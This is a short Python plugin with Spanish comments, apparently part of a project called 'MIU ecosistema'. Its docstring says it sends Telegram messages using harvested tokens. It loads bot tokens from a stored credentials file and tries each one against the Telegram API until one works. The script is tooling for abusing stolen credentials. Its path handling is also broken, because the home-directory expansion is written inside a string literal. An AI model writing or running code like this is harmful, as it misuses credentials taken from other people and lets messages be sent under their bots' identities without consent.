#!/usr/bin/env python3
"""
NOTIFICADOR — Envía mensajes por Telegram usando tokens recolectados
Uso: python3 plugins/notificador.py "@canal" "Mensaje desde MIU"
"""
import os, sys, json, urllib.request
from pathlib import Path

MIU_DIR = Path("os.path.expanduser('~')/miu-ecosistema")

def get_telegram_tokens():
    tokens = []
    path = MIU_DIR / "nutrientes" / "credenciales_v2.json"
    if path.exists():
        with open(path) as f:
            data = json.load(f)
        for h, c in data.items():
            if c.get("tipo") == "telegram" and ":" in c.get("token", ""):
                tokens.append(c["token"])
    return tokens

def send_message(chat_id, text):
    tokens = get_telegram_tokens()
    if not tokens:
        return {"error": "No hay tokens de Telegram"}
    for token in tokens:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        body = json.dumps({"chat_id": chat_id, "text": text}).encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return {"ok": True, "token_prefix": token.split(":")[0]}
        except Exception as e:
            continue
    return {"error": "Todos los tokens fallaron"}

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 plugins/notificador.py CHAT_ID MENSAJE")
        sys.exit(1)
    result = send_message(sys.argv[1], sys.argv[2])
    print(json.dumps(result, indent=2))

